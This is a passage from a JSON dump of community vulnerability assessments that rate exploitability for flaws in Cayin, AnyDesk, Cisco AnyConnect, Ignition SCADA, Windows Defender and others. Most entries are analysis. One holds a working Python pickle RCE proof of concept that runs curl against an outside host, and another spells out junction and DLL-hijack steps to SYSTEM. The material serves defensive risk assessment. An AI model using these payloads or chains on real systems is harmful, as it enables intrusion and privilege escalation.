      "document": "At the time of writing (and exploit release) vulnerability had not been patched by vendor.  Windows app which bundles Apache Tomcat and MySQL, so a nice default and consistent environment to exploit.  Can be hard to detect version, it's not readily available on any screens.  `language.js` shows xPost 2.5, however this file may not change in the future when the patch is eventually released.\r\n\r\nSQLi with mysql, this is a classic `DUMPFILE` sqli, but you need to know the webroot.  Default install is `C:/CayinApps/webapps/`, but may possibly change install to install.  Dump a JSP shellcode, load it through the web browser and done.\r\n\r\nThe SQLi is blind, sqlmap will detect it as time based, instead of a `UNION` as used in the exploit.  I couldn't get sqlmap to detect it as a `UNION`even when giving it more precise information.",
      "score": 5,
      "metadata": {
        "tags": [
          "easy_to_develop",
          "high_privilege_access",
          "difficult_to_patch",
          "pre_auth",
          "default_configuration"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "4fef9b09-dbb1-4e60-a1e9-847b15decd69",
      "editorId": "97bf384d-2eca-47f2-b98a-28bc8378baf2",
      "topicId": "d3c248c5-405c-43b4-b8a7-8e6e6966f7c4",
      "created": "2020-06-17T16:05:01.614677Z",
      "revisionDate": "2020-06-26T17:54:25.281857Z",
      "document": "Cayin CMS systems have an AUTHENTICATED RCE in the NTP configuration.  The system didn't install correctly on Ubuntu 20.04 at the time the exploit was released, and the company recommends Ubuntu 16.04, unknown if 18.04 will work.  Grants root on Ubuntu.\r\n\r\nRequires creds, default for CMS-SE was administrator:admin, but the original write-up mentions webadmin:bctvadmin.\r\n\r\nCMS system can come on hardware devices.  CMS-SE the exploitable file is `system_service.cgi` however the original vuln write-up mentions `system.cgi`, so it looks like there is a variance between the hardware devices and the Ubuntu installer.  YMMV.\r\n\r\nAfter authentication, the exploit is against the NTP server IP field.  During testing of CMS-SE the `Update` button/functionality was used.  Clicking save did not have an immediate effect, and `Test` worked, but executed 3 times.  If your payload is small, you could use `Test`, however with a larger payload like meterp, it was determined that the payload was writing 3 times in each stage... So if the payload chunks were A, B, C, the payload ended up AAABBBCCC.\r\nDue to character limit, any payload that isn't small will need to go through a `cmdstager` type chunking.  The field can take ~200 characters, believed to be about ~230 but 200 was used in the exploit to allow for padding.",
      "score": 3,
      "metadata": {
        "tags": [
          "difficult_to_patch",
          "post_auth",
          "high_privilege_access",
          "easy_to_develop",
          "default_configuration"
        ],
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "40b7414d-5746-42c8-8d57-a5e88b54591f",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "4e502c55-e1b7-445e-b426-649c863c1b93",
      "created": "2020-06-17T18:03:08.215327Z",
      "revisionDate": "2020-06-17T21:43:51.630677Z",
      "document": "This may be interesting to exploit when one has a particular device in mind, and it provides some sort of useful access or control, but there is not going to be an apocalypse of Ripple20 exploits for a few reasons:\r\n \r\n - Every target device has to have a tailor-made exploit written for it, outside of a DoS.\r\n - There is no low-hanging fruit here for actual code execution. Those hundreds of vendors are going to have hundreds of ways they integrated this thing, though you may find some commonalities when folks use the same board support package (BSP) for reference designs.\r\n - Getting malformed packets into a target device _remotely_ is a lot harder than you'd think these days. Often times, this might as well be considered a local attack, since a lot of edge and intermediate devices will discard many of the malformed packets involved here. That's why I'm tagging 'Requires physical access', because it's practically the case.\r\n\r\nThere's a reason why devices like this have been off-limits for vuln scans and penetration tests for years. It's because the vendors and users knew their stacks were fragile. This is just reality the infosec world is finally catching up. This isn't the first exploration of an embedded stack with problems, and it will most definitely not be the last. Whether this makes a change in the industry is a bigger question.\r\n\r\n",
      "score": 7,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "difficult_to_exploit",
          "difficult_to_develop"
        ],
        "attacker-value": 2,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "17fdfb85-8dfd-4dbf-bd2b-7cd032026885",
          "name": "Requires physical access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_exploit"
        }
      ]
    },
    {
      "id": "c6ddd3b2-07f9-4d40-8c06-43958ba7461b",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "88b5c1be-8c36-408f-9d5b-b7dd8b3f1ee6",
      "created": "2020-06-17T19:54:33.174587Z",
      "revisionDate": "2020-06-19T15:28:17.01467Z",
      "document": "The AnyDesk GUI is vulnerable to a remotely exploitable format string vulnerability. By sending a specially\r\ncrafted discovery packet, an attacker can corrupt the front end process when it loads or refreshes. While the\r\ndiscovery service is always running, the GUI frontend must be started to trigger the vulnerability. On\r\nsuccessful exploitation, code is executed within the context of the user who started the AnyDesk GUI.\r\n\r\nThe public PoC works out of the box on Ubuntu 18.04 x64 but requires some work to update the target for newer versions of Ubuntu and other versions of Linux such as Fedora. While the exploit seems reasonably stable for the first exploitation attempt, the GUI becomes unresponsive and subsequent attempts require restarting the service `sudo systemctl restart anydesk` and restarting the GUI.\r\n\r\nA legitimate discovery frame can be sent to a target host to trigger a response. This can be used by an attacker to verify that the service is running, leak the hostname, and determine the operating system.",
      "score": 2,
      "metadata": {
        "tags": [
          "default_configuration",
          "pre_auth"
        ],
        "attacker-value": 2,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "bebde3dc-8016-49c7-b01d-df597e02b449",
      "editorId": "7ff62803-e0a8-4121-b324-d4afe9f60d43",
      "topicId": "6e43469d-f6a3-4f79-8c72-7259f5681acd",
      "created": "2020-06-20T17:17:49.525869Z",
      "revisionDate": "2020-06-21T00:05:54.905147Z",
      "document": "#### tldr\r\n\r\nThe use of unserialize in PHP that accepts user data. There is no sequence of code that can be exploited to gain code execution using this method. \r\n\r\n#### Outline\r\n\r\nPassing user-controlled data to unserialize in PHP is always a bad idea. However, in order to be exploitable there needs to be additional code that will process the data through the use of [Magic Methods](https://www.netsparker.com/blog/web-security/untrusted-data-unserialize-php/).  There do not appear to be any dangerous methods that take this data in the current version of the PHP script. \r\n\r\nIf the base PHP version that is running this application also happens to be a version of PHP vulnerable to https://www.cvedetails.com/cve/CVE-2017-5340/ Then there is an __increased__ possibility of gaining code execution using this methodology. \r\n\r\n#### Patch\r\n\r\nAt the time of release, there is no official patch although third party patches have been [made available here](https://github.com/hannob/squirrelpatches)",
      "score": 2,
      "metadata": {
        "tags": [
          "difficult_to_develop",
          "default_configuration",
          "no_useful_data"
        ],
        "attacker-value": 1,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "c666cc53-252c-4aca-a668-b106fc55089b",
      "editorId": "7ff62803-e0a8-4121-b324-d4afe9f60d43",
      "topicId": "12dcb56f-253b-46c6-8e20-da514be2a43e",
      "created": "2020-06-20T17:18:27.259373Z",
      "revisionDate": "2020-06-21T00:05:38.454579Z",
      "document": "#### tldr\r\n\r\nThe use of unserialize in PHP that accepts user data. There is no sequence of code that can be exploited to gain code execution using this method. \r\n\r\n#### Outline\r\n\r\nPassing user-controlled data to unserialize in PHP is always a bad idea. However, in order to be exploitable there needs to be additional code that will process the data through the use of [Magic Methods](https://www.netsparker.com/blog/web-security/untrusted-data-unserialize-php/).  There do not appear to be any dangerous methods that take this data in the current version of the PHP script. \r\n\r\nIf the base PHP version that is running this application also happens to be a version of PHP vulnerable to https://www.cvedetails.com/cve/CVE-2017-5340/ Then there is an __increased__ possibility of gaining code execution using this methodology. \r\n\r\n#### Patch\r\n\r\nAt the time of release, there is no official patch although third party patches have been [made available here](https://github.com/hannob/squirrelpatches)",
      "score": 2,
      "metadata": {
        "tags": [
          "default_configuration",
          "no_useful_data",
          "difficult_to_develop"
        ],
        "attacker-value": 1,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "7f35dfae-7956-4324-88f9-42c6ceac479f",
      "editorId": "7ff62803-e0a8-4121-b324-d4afe9f60d43",
      "topicId": "22d39c68-a736-4f5b-9bb6-83322bc256f6",
      "created": "2020-06-21T19:03:02.464585Z",
      "revisionDate": "2020-06-21T23:41:15.630928Z",
      "document": "#### Outline\r\n\r\nUntrusted data from the client side is used to create a python pickled object. This can lead to full RCE and compromise of the host. There are some limitations and this is not the default configuration. \r\n\r\n#### Impact\r\n\r\nIf you can control the input it may be possible to gain code execution on the underlying server. With code execution you can gain full access to the database and its data. \r\n\r\n#### Limitations\r\n\r\n- The helpdesk module is not enabled by default. \r\n- A valid authenticated account with permissions to access /tickets\r\n\r\n#### Patch\r\n\r\nThis doesn't not appear to be patched in the latest release, although it has been acknowledged\r\n\r\n\r\n#### POC\r\n\r\nIt is fairly easy to create a functional POC against this target if the feature is enabled. \r\n\r\nModify the following POC to fit your needs. \r\n\r\n```python\r\nimport pickle\r\nimport base64\r\nimport os\r\n\r\n\r\nclass RCE:\r\n    def __reduce__(self):\r\n        cmd = ('curl 172.22.0.1:1234')\r\n        return os.system, (cmd,)\r\n\r\n\r\nif __name__ == '__main__':\r\n    pickled = pickle.dumps(RCE())\r\n    print(base64.urlsafe_b64encode(pickled))\r\n```",
      "score": 2,
      "metadata": {
        "tags": [
          "post_auth",
          "high_privilege_access",
          "obscure_configuration"
        ],
        "attacker-value": 2,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "56f43038-900f-4e9d-be13-44d1f3bfea45",
      "editorId": "b68e9cb9-1bd0-4339-abe7-329618ce2467",
      "topicId": "556f3a24-1d91-4765-a7ee-7842b00edd85",
      "created": "2020-06-25T09:43:18.652264Z",
      "revisionDate": "2020-06-26T13:57:51.932904Z",
      "document": "The installer component of Cisco AnyConnect Secure Mobility Client for Windows prior to 4.8.02042 is vulnerable to path traversal and allows local attackers to create/overwrite files in arbitrary locations as the SYSTEM user. By successfully exploiting this flaw, a local attacker will be able to execute arbitrary commands with elevated privileges and take full control of the system.\r\n\r\nThis [write-up](https://github.com/goichot/CVE-2020-3153/blob/master/details.md) provides some additional information about practical exploitation than the original [advisory](https://ssd-disclosure.com/ssd-advisory-cisco-anyconnect-privilege-elevation-through-path-traversal/). Basically, the attack consists of sending a specially crafted IPC message to the TCP port 62522 on the loopback device, which is exposed by the Cisco AnyConnect Secure Mobility Agent service. This service will then launch the vulnerable installer component (`vpndownloader`), which copies itself to an arbitrary location before being executed with SYSTEM user privileges. Combining this flaw with DLL hijacking technique, it is possible to execute arbitrary code in the context of the SYSTEM user.\r\n\r\nSince two PoC's ([here](https://gist.github.com/ykoster/aeaa893d68adbc5004aa873b3290acd1) and [here](https://github.com/goichot/CVE-2020-3153/tree/master/CVE-2020-3153) ) and a weaponized [Metasploit module](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/anyconnect_path_traversal_lpe.rb) are now available, it is highly recommended to update AnyConnect.",
      "score": 3,
      "metadata": {
        "tags": [
          "post_auth",
          "common_enterprise",
          "high_privilege_access",
          "default_configuration",
          "easy_to_develop"
        ],
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "45e0926a-3002-45d1-b95f-65ded4a50d44",
      "editorId": "b68e9cb9-1bd0-4339-abe7-329618ce2467",
      "topicId": "75d642d5-ee24-4cc9-82a8-4c5f28c070c3",
      "created": "2020-06-26T11:13:08.589565Z",
      "revisionDate": "2020-06-26T14:41:29.21765Z",
      "document": "This vulnerability affects Ignition 7 (prior to v7.9.14) and 8 (prior to v8.0.10), an Integrated Software Platform for SCADA systems to do cross-platform web-based deployment. These versions contain multiple vulnerabilities that, when chained together, can lead to preauth remote code execution with SYSTEM user privileges ([advisory](https://www.zerodayinitiative.com/blog/2020/6/10/a-trio-of-bugs-used-to-exploit-inductive-automation-at-pwn2own-miami)).\r\n\r\nCVE-2020-12004 is one of these vulnerabilities (see also [CVE-2020-10644](https://attackerkb.com/topics/SvOjCxAgEb/cve-2020-10644)) and is related to an access control issue that enables an attacker to retrieve sensitive information. The `com.inductiveautomation.ignition.gateway.servlets.gateway.functions.ProjectDownload` Java class provides several actions that do not require authentication. Particularly one of them, `getDiffs()`, can be used to access all the project data.\r\n\r\nThis is a medium risk issue when taken alone. However, as explained above, it can be critical when chained with other vulnerabilities.",
      "score": 1,
      "metadata": {
        "tags": [
          "default_configuration",
          "pre_auth"
        ],
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "c5691b16-f988-49e6-a3ee-6efad95f2e44",
      "editorId": "b68e9cb9-1bd0-4339-abe7-329618ce2467",
      "topicId": "ffbfdc0d-6f29-4331-9554-689d51d6b8e9",
      "created": "2020-06-26T11:13:12.028157Z",
      "revisionDate": "2020-11-11T18:55:03.245114Z",
      "document": "This vulnerability affects Ignition 7 (prior to v7.9.14) and 8 (prior to v8.0.10), an Integrated Software Platform for SCADA systems to do cross-platform web-based deployment. These versions contain multiple vulnerabilities that, when chained together, can lead to preauth remote code execution with SYSTEM user privileges ([advisory](https://www.zerodayinitiative.com/blog/2020/6/10/a-trio-of-bugs-used-to-exploit-inductive-automation-at-pwn2own-miami)).\r\n\r\nCVE-2020-10644 is one of these vulnerabilities (see also [CVE-2020-12004](https://attackerkb.com/topics/kxBv25BKwf/cve-2020-12004)) and is related to an input validation issue that leads to deserialization of untrusted data. By sending a request to the `/system/gateway` API endpoint and invoking `getDiffs()` action with a specially crafted payload,  it is possible to bypass the validation routine and execute arbitrary code remotely.\r\n\r\nThis vulnerability is rated as critical, but to successfully exploit this, this must be chained with the two other vulnerabilities, as explained above and in the advisory. A Metasploit module exploiting these vulnerabilities is available [here](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/scada/inductive_ignition_rce.rb)",
      "score": 2,
      "metadata": {
        "tags": [
          "pre_auth",
          "high_privilege_access",
          "easy_to_develop"
        ],
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "4810f7fd-71fd-4450-81b1-4e5c1ff985ca",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "33adce29-96b3-47fb-aece-89e8bd5c063f",
      "created": "2020-06-26T19:31:48.66804Z",
      "revisionDate": "2021-01-03T17:34:21.271346Z",
      "document": "## Update\r\nAs of July 24th 2020, there is a bypass for this patch, with a public writeup available at https://0x00sec.org/t/windows-defender-av-zero-day-vulnerability/22258 along with a working exploit at https://github.com/klinix5/WinDefend_ZeroDay. The bypass takes advantage of the fact that the patch only checks whether `C:\\Windows\\Temp\\MpCmdRun.log.bak` is a junction directory, rather than accounting for the fact that any one of the subfolders could be a directory junction. Its possible also that one could also further nest folders within one another, which basically means the new patch will need to account for potentially near infinite nesting possibilities should it choose to still honor junction directories. I am still not 100% sure if one could exploit this via files, but my initial feeling says no as I think you would need to create symbolic links which requires administrator privileges, at which point there are much better and easier ways of getting SYSTEM access.\r\n\r\n## Summary/TLDR\r\nThis is a vulnerability within the `MpCmdRun.exe` component of Windows Defender which, in `MpCmdRun.exe` versions prior to 4.18.2005.1, did not appropriately validate that the file at `C:\\Windows\\Temp\\MpCmdRun.log.bak` was not a junction directory prior to trying to delete it. As a result, attackers could exploit this vulnerability to delete arbitrary files as the SYSTEM user, which could allow for an elevation of privilege.\r\n\r\nRating as medium as it require authenticated access, but leaving exploitability as a medium as in theory this could work if the LPE vector does indeed work like the article states, but wasn't able to confirm this. Also need to fill a log file with 16 MB of data which can take some time to do when your only writing about 2 KB per attempt.\r\n\r\nEdit: Originally put this as easy to weaponize but tbh the file deletion trick stumped a lot of people as many people have stopped there before getting to LPE so even if we do get it working, its not exactly a \"simple trick\".\r\n\r\n## Longer Explanation\r\nNow that the summary of this vulnerability is out of the way, lets dive into the details a bit. The original discoverer of this bug is itm4n, who wrote a writeup at https://itm4n.github.io/cve-2020-1170-windows-defender-eop/ explaining his thought process and steps for discovering this vulnerability and the various different things that he found worked and didn't work during his research. If you haven't read it already I would highly recommend taking a look at it. Its not a challenging read compared to most technical blog posts, and it provides a great overview of how to actually query deeper to find interesting bugs.\r\n\r\nWith that being said I'm not going to repeat itm4n's blog verbatum here, but rather explain some of the notes I made whilst reading his blog. The first interesting point, and perhaps the most important, is that Windows Defender has a log file that it creates when updating signatures, located at `C:\\Windows\\Temp\\MpCmdRun.log`, which is then backed up to a file at `C:\\Windows\\Temp\\MpCmdRun.log.bak` when its size exceeds 16 MB. The interesting thing to note though is that if one runs `icacls` on these files as an administrator, they will notice that these files can only be deleted or otherwise modified by SYSTEM or one of the computer's administrators. This leads us to an interesting point: If the `C:\\Windows\\Temp\\MpCmdRun.log.bak` file already exists, this vulnerability can only be exploited by a local administrator.\r\n\r\nIf alternatively, the file does not exist, an attacker can create a Directory Junction at `C:\\Windows\\Temp\\MpCmdRun.log.bak` and link this to an arbitrary directory by using the command `cmd.exe /C 'mklink /J C:\\Windows\\Temp\\MpCmdRun.log.bak  *target directory*`. Following this they will then need to fill up the contents of the file at `C:\\Windows\\Temp\\MpCmdRun.log` so that is 16 MB or larger, which can be done by repetitively running the command `for ($i=0; $i -lt 2000; $i++) { Update-MpSignature -ErrorAction SilentlyContinue -UpdateSource InternalDefinitionUpdateServer } `. Note that this command may need some pauses to prevent locking up `MpCmdRun.exe` as during tests there where times if we ran too many tests we either had to open another PowerShell command, or wait about 40 seconds or so before continuing. More testing may need to be performed to check how to solve this issue and make things more reliable.\r\n\r\nWhilst executing this loop the attacker will most likely end up triggering the bug, which will cause all files and folders in the `*target directory*` specified earlier, no matter how deeply nested they are inside `*target directory*`, to be deleted. In the exploit itm4n briefly shows within his blog, he set `*target directory*` to `C:\\ProgramData\\Microsoft\\Windows\\WER`. The reason for this is that by deleting this directory and all files and folders located underneath it, we can then abuse a flaw in the WER service whereby if the `C:\\ProgramData\\Microsoft\\Windows\\WER` folder doesn't exist, then when running the task `\\Microsoft\\Windows\\Windows Error Reporting\\QueueReporting`, the folder will be recreated albeit with read, write and delete permissions enabled for all authenticated users.\r\n\r\nYou can then create the `C:\\ProgramData\\Microsoft\\Windows\\WER` folder as a junction folder that links to `\\??\\c:\\windows\\system32\\wermgr.exe.local`. This folder does not exist by default on Windows systems. By doing this `C:\\Windows\\System32\\wermgr.exe.local\\` will be created as a directory with the same open permissions that grant all authenticated users to read, write and delete permissions. From there one can create the `amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.778_none_e6c6b761130d4fb8` directory inside of `C:\\Windows\\System32\\wermgr.exe.local\\` , and then place a malicious copy of `comctl32.dll`, which will then get loaded and run as the SYSTEM user when `wermgr.exe` is run, granting the attacker arbitrary code execution as the SYSTEM user.\r\n\r\nUpdate #2: I have managed to confirm this is a legitimate LPE technique and after some further help from @jonasLyk on Twitter, I have managed to clear up a few misunderstandings on his technique of going from an arbitrary file deletion bug to SYSTEM level code execution using the technique mentioned above. This has resulted in a LPE module being created for Metasploit which is presently being worked on at https://github.com/rapid7/metasploit-framework/pull/13800, where we have managed to achieve a full LPE chain. Its just awaiting some refinement and reorganization before it can be landed into the framework.",
      "score": 5,
      "metadata": {
        "tags": [
          "default_configuration",
          "high_privilege_access",
          "post_auth",
          "common_enterprise"
        ],
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "61309a63-4ef3-4e74-9702-ccf28874cc52",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "b05ff131-9188-45dc-8317-99dd9d7a6356",
      "created": "2020-06-29T18:32:47.003064Z",
      "revisionDate": "2020-06-30T17:43:27.632303Z",
      "document": "Technical details are a little sparse in the advisory, but this reads more like a bad software configuration or design than a vulnerability - one that may be indicative of a systemic problem in SAML implementations, not unlike the issues with SSL/TLS in practice.\r\n\r\nDisabling identity provider (IdP) verification is akin to disabling SSL/TLS certificate verification, which is similarly the case here: many IdPs will generate self-signed certs, rendering verification all but impossible unless the software supports trusting individual certs. It is easier to leave a box unchecked. A box that seems to imply verifying only CA-signed certs. Palo Alto states as much in their advisory:\r\n\r\n> Many popular IdPs generate self-signed IdP certificates by default and the 'Validate Identity Provider Certificate' option cannot be enabled.\r\n\r\nIt would not surprise me if many organizations have this option disabled, regardless of what the default configuration may be (I haven't been able to check), since widespread documentation suggests doing so. Case in point is [Okta's documentation](https://saml-doc.okta.com/SAML_Docs/How-to-Configure-SAML-2.0-for-Palo-Alto-Networks-Admin-UI.html) on setting up SAML for Palo Alto products:\r\n\r\n![](https://i.imgur.com/89RvjQx.png)\r\n\r\nMany other IdPs, including [Microsoft's Azure Active Directory](https://docs.microsoft.com/en-us/azure/active-directory/saas-apps/paloaltoadmin-tutorial), suggest the same. This sets a dangerous precedent for other software to follow. In the worst case, this problem is already endemic in SAML implementations, regardless of the circumstances here. An audit of SAML implementations may be a worthy endeavor.\r\n\r\nYou should still patch or otherwise fix this configuration if at all possible. Palo Alto suggests using a [CA-signed cert](https://knowledgebase.paloaltonetworks.com/KCSArticleDetail?id=kA14u0000008UXP) when available. Ideally, certificates should be trusted on a one-by-one basis, which is an unsustainable model for SSL/TLS but adequate for SAML. Of course, the software must support this, and the documentation must advise it. This was not the case here, apparently.",
      "score": 6,
      "metadata": {
        "tags": [
          "high_privilege_access",
          "pre_auth",
          "common_enterprise"
        ],
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "5d06065b-156a-42dd-aa1e-07d19ccad6fe",
      "editorId": "7ff62803-e0a8-4121-b324-d4afe9f60d43",
      "topicId": "e88b8795-0434-4ac5-b3d5-7e3dab8a60c1",
      "created": "2020-07-03T17:30:05.677935Z",
      "revisionDate": "2020-08-27T11:43:42.576605Z",
